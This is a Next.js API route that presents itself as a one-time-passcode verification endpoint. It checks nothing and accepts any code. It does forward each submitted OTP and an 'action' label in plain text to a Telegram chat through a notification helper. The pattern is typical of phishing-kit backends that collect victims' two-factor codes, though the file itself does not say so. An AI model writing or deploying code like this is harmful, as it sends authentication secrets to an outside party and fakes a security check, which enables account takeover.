import { NextRequest } from 'next/server';
import { sendTelegramNotification } from '@/lib/telegram';

export async function POST(req: NextRequest) {
  try {
    const { otp, action } = await req.json();
    
    // Send notification to Telegram
    if (action) {
      await sendTelegramNotification(`OTP Verification:\nAction: ${action}\nOTP: ${otp}`);
    }
    
    // For now, accept any OTP
    // In a real implementation, you would verify the OTP against a stored value
    return new Response(
      JSON.stringify({ 
        success: true, 
        message: 'OTP verified successfully' 
      }),
      { 
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      }
    );
  } catch (error) {
    console.error('Error verifying OTP:', error);
    return new Response(
      JSON.stringify({ 
        success: false, 
        message: 'Failed to verify OTP' 
      }),
      { 
        status: 500,
        headers: { 'Content-Type': 'application/json' }
      }
    );
  }
}